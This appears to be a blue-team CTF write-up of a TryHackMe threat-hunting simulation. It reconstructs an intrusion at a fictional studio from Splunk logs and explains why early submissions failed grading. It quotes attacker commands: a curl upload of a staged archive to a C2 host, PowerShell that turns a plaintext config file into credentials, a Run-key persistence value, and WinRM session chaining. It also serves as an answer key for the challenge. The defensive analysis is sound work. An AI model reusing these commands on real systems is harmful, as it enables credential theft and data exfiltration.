# Quiet as the Grave (TryHackMe, Downtime Threat Hunting Sim)

- **Event/module:** Strange & Unusual Activity ("Downtime" / ShowDowntime) blue-team CTF, 22 to 26 Oct 2026.
  Mission 02 of 8. **Threat Hunting Simulator** (hypothesis-driven hunt in Splunk). Difficulty: hard.
- **Date:** 2026-10-23.
- **Status:** SOLVED on the **4th attempt** (2026-10-23). The investigation was right from attempt 1, but the
  first three submissions failed grading because the chain was the wrong *shape* (scored 493, "Trail went
  cold"). The pass came after rebuilding the 9 cards straight from the actor's PowerShell script blocks:
  hypothesis Proven, one adversary action per card, correct asset/user per card. **+500 team points**, 1
  raffle ticket. The verified chain is below; the failed first shape is kept for the lesson.
- **SIEM:** Splunk Enterprise over the THM reverse proxy. Telemetry = Sysmon (EventCode 1 ProcessCreate,
  3 NetworkConnect) + Security log (4624/4625/4648/4697). Incident data is dated **2026-09-10**.
- **Victim org:** TryHatMe Studios (`tryhatmestudios.thm`), protecting the unreleased **NeuralNexus** build.
  Corporate LAN `<ip>/24`, DC = `DC-01`. Actor = **Pinstripe Moth** (same crew as [[repossessed]]).

## Hypothesis (PROVEN)

"A lure to a developer gave the actor a foothold, from which it used **valid credentials and legitimate
Windows tooling** to move through the environment toward NeuralNexus, and data was taken." Every clause
confirmed.

## Verified attack chain (evidence-backed, the resubmission)

Rebuilt from the actor's own PowerShell script blocks (EventCode 4104), the Run-key RegistrySet
(EventCode 13) and the `net.exe` process creates (EventCode 1). A different *shape* than our first
submission: no standalone C2 or Initial Access stage, **three** Lateral Movement stages, and Credential
Access is reading a **plaintext config file**, not SYSVOL.

| # | Stage (tactic / technique) | Time (2026-09-10) | User | Asset | Evidence |
|---|---|---|---|---|---|
| 1 | Execution (T1059.001 PowerShell) | 12:29:49 | s.reyes | THM-SREYES | `powershell.exe -NoProfile -File` runs `review-helper.ps1` from `Downloads\NeuralNexusReview`; it is a C2 implant beaconing HTTPS to `<ip>:8443` (cert-pinned, `X-QL-Token`), polling `/register` `/task` `/result` ~150s, running tasks via `[scriptblock]::Create()` |
| 2 | Persistence (T1547.001 Run key) | 12:37:20 | s.reyes | THM-SREYES | HKCU Run value `NeuralNexusReview` = `powershell.exe -NoProfile -File "...\AppData\Local\NeuralNexus\review-helper.ps1"`; AppData copy seen executing 12:44:06 |
| 3 | Credential Access (T1552.001 creds in files) | 13:01:41 | s.reyes | THM-SREYES | `Get-Content -Raw ...\tools\deploy-settings.json \| ConvertFrom-Json` then `[pscredential]::new($cfg.username,$cfg.password)` -> **svc-studioops** (no LSASS) |
| 4 | Lateral Movement (T1021.006 WinRM) | 13:16:42 | svc-studioops | THM-LSULLIVAN | `New-PSSession -ComputerName THM-LSULLIVAN -Credential $cred`; at 13:36:43 reads support inventory `C:\ProgramData\StudioOps\endpoint-list.csv` + `maintenance-runbook.txt` |
| 5 | Lateral Movement (T1021.006 WinRM) | 13:48:25 | svc-studioops | DC-01 | from the LSULLIVAN session, `New-PSSession -ComputerName DC-01 -Credential $cred`; 4624 Type 3 on DC-01 at 13:48:25, zero 4625 |
| 6 | Lateral Movement (T1021.006 WinRM) | 15:03:36 | svc-studioops | THM-MSMITH | nested hop LSULLIVAN -> THM-MSMITH (`$global:marketing = New-PSSession ...`), `dir C:\StudioMarketing\approved-release` (release directory) |
| 7 | Discovery (T1069.001 local groups) | 16:03:38 | svc-studioops | THM-MSMITH | inside MSMITH WinRM session (parent `wsmprovhost.exe`): `net.exe user`, `net.exe localgroup Administrators`, `net.exe share`, recursive `Get-ChildItem` of StudioMarketing + StudioOps |
| 8 | Collection (T1560.001 archive) | 16:27:28 | s.reyes | THM-SREYES | staged into `%TEMP%\review-staging\{marketing,project}` (16:27:01, pulled approved-release from MSMITH + NeuralNexus release-notes), then `Compress-Archive ... -DestinationPath "$env:TEMP\review-cache.zip"` |
| 9 | Exfiltration (T1041 over C2) | 16:27:54 | s.reyes | THM-SREYES | `curl.exe --insecure --upload-file ...review-cache.zip` to `<ip>:8443` (same C2 channel as the beacon) |

**Confirmed IOC set (per stage, matches grader labels):** S1 malicious helper script `review-helper.ps1` +
C2 IP `<ip>:8443`; S2 Run key `NeuralNexusReview` + payload `AppData\Local\NeuralNexus\review-helper.ps1`;
S3 cred config `C:\StudioProjects\NeuralNexus\tools\deploy-settings.json` + `svc-studioops`; S4 `C:\ProgramData\StudioOps\endpoint-list.csv`
+ `svc-studioops`; S5 `svc-studioops`; S6 `C:\StudioMarketing\approved-release` + `svc-studioops`; S7 `net localgroup Administrators`
(+ `net user`, `net share`); S8 `review-cache.zip` + staging dir `%TEMP%\review-staging`; S9 `review-cache.zip` + dest `<ip>:8443`.

## What we first submitted (WRONG shape - failed 3x, scored 493)

| # | Stage | Time (2026-09-10) | Host | Evidence |
|---|---|---|---|---|
| 1 | Initial Access (T1566) | 12:29:48 | THM-SREYES | `explorer.exe` -> `review-helper.ps1` from `Downloads\NeuralNexusReview\`, run by `s.reyes` |
| 2 | Execution (T1059.001) | 12:29:49 | THM-SREYES | `review-helper.ps1` -> `csc.exe @*.cmdline` (in-memory C# loader) |
| 3 | Persistence (T1547.001) | ~12:44 | THM-SREYES | copied to `AppData\Local\NeuralNexus\review-helper.ps1`, relaunched by `explorer` (Run/Startup) |
| 4 | C2 (T1071.001) | 12:29 to 16:28 | THM-SREYES | `powershell` -> `<ip>:8443`, 161 beacons (~90s), persisted to 10 Oct |
| 5 | Discovery (T1087.002) | 12:46 to 16:12 | THM-SREYES | `whoami`, `nltest /dsgetdc:tryhatmestudios.thm`, `net user /domain`, `dir SYSVOL\scripts` |
| 6 | Credential Access (T1552.001) | 13:11:08 | DC SYSVOL | lifted `svc-studioops` password from a SYSVOL **logon script** (no LSASS) |
| 7 | Lateral Movement (T1021.006 WinRM) | 13:16 to 16:27 | LSULLIVAN, DC-01, MSMITH | `svc-studioops` over WinRM: SREYES->LSULLIVAN->DC-01 + ->MSMITH->DC-01 |
| 8 | Collection (T1560.001) | ~16:27 | THM-SREYES | `review-cache.zip` staged in `%TEMP%` |
| 9 | Exfiltration (T1041) | 16:27:54 | THM-SREYES | `curl --insecure --upload-file ...review-cache.zip https://<ip>:8443/ingest/review-cache.zip` |

**Why it failed:** our investigation was right (foothold, svc-studioops, WinRM, exfil all correct) but we
compressed the three WinRM hops into one Lateral Movement card, spent two cards (Initial Access + Execution)
on what the grader treats as one Execution stage, and sourced creds from SYSVOL instead of the credential
config file the actor actually read. The grader wants one adversary action per card, correct asset per card.

## IOCs

- **Files:** `review-helper.ps1` (lure + persistence copy in `AppData\Local\NeuralNexus`), `review-cache.zip`
  (staged archive in `%TEMP%`).
- **Network:** `<ip>:8443` (HTTPS C2 and exfil), URL `/ingest/review-cache.zip`.
- **Accounts:** `s.reyes` (patient zero), **`svc-studioops`** (service account read in cleartext from
  `C:\StudioProjects\NeuralNexus\tools\deploy-settings.json`, used over WinRM to reach LSULLIVAN, DC-01, MSMITH).
  NOTE: the SYSVOL logon-script theory below was our *wrong* first guess; the real source was the config file.
- **Hosts:** `THM-SREYES` (10.60.10.x), `THM-LSULLIVAN` (IT), `THM-MSMITH` (Marketing), `DC-01`.

## Key hunting techniques / lessons

- **The grader scores the *shape*, not just the facts.** Our investigation was correct on attempt 1, yet it
  failed three times (493, "Trail went cold"). The TH Sim wants **one adversary action per card, with the
  right asset and user on each**. Our failing chain split execution across two cards (Initial Access +
  Execution), collapsed three WinRM hops into a single Lateral Movement card, and mislabelled the Discovery
  asset. Rebuilt to 9 one-action cards it passed. **Re-shape before you re-investigate.**
- **Read the PowerShell script blocks (EventCode 4104) verbatim; do not infer the chain.** This was the whole
  win. `index=* EventCode=4104 (ConvertFrom-Json OR Invoke-Command OR New-PSSession OR Compress-Archive ...)`
  returned the actor's own code: the cred-file read, the session chaining, the staging, the archive, all in
  order. Every "likely" guess we had made was replaced by an exact path and timestamp. The logs held the
  answer key; we just had not read the right events.
- **Credentials came from a plaintext config file, not SYSVOL.** The real source was
  `C:\StudioProjects\NeuralNexus\tools\deploy-settings.json`, read with `Get-Content -Raw | ConvertFrom-Json`
  and turned into a `[pscredential]`. Our earlier SYSVOL-logon-script theory (kept in the IOC note above)
  was a plausible-but-wrong guess. **Check for `ConvertFrom-Json` + `[pscredential]::new(...)` before
  assuming LSASS or SYSVOL** - T1552.001 Credentials In Files is quiet and common.
- **Nested WinRM: the asset is the innermost host, not where the command was typed.** The `net user` /
  `net localgroup Administrators` / `net share` discovery was issued from THM-SREYES but ran *inside* a
  session chained SREYES -> LSULLIVAN -> MSMITH. On THM-MSMITH those `net.exe` process-creates (EventCode 1)
  show **parent `wsmprovhost.exe`** = inbound WinRM, so the correct Discovery asset is **THM-MSMITH**. This
  exact mismatch cost us the Stage 7 asset on the failing attempts.
- **Splunk field gotcha:** the `host` field is the **Splunk forwarder address** (e.g. `<ip>:8989`),
  NOT the Windows hostname. Filter on **`ComputerName`**. `host=THM-SREYES` returns 0.
- **The HKCU Run key is the persistence tell (EventCode 13).** `...\CurrentVersion\Run\NeuralNexusReview` =
  `powershell.exe -NoProfile -File "...\AppData\Local\NeuralNexus\review-helper.ps1"`. The implant copied
  itself to AppData and that AppData copy was then seen executing at 12:44:06, closing the loop.
- **`4624 Type 3` on `DC-01` (excluding machine accounts) confirmed the DC logon** at 13:48:25 with zero
  `4625` failures - valid creds, successful access. Use it when `Account_Name` will not extract.
- **Same actor, different kit than Repossessed.** Repossessed = macro `.docm` -> `svchost_update.ps1` ->
  `vaultcmd` creds -> service-creation lateral move -> `nx_build_beta.7z` -> C2 8067. Here = `.ps1` C2 implant
  -> Run-key persistence -> config-file creds (`svc-studioops`) -> WinRM lateral move (LSULLIVAN, DC-01,
  MSMITH) -> `review-staging` + `Compress-Archive` -> `curl --upload-file` to C2 8443. Pinstripe Moth adapts
  tooling per intrusion, but both intrusions chase the **NeuralNexus** build.

## Related

- [[repossessed]] - Downtime mission 01, same actor/studio, the SOC-sim view of a parallel intrusion.
- [[downtime-event]] - event tracker. [[intro-to-ad-lateral-movement]] - WinRM/lateral-movement primer.
- [[tryhackme-learning-buddy]] / [[ctf-workspace-dir]].
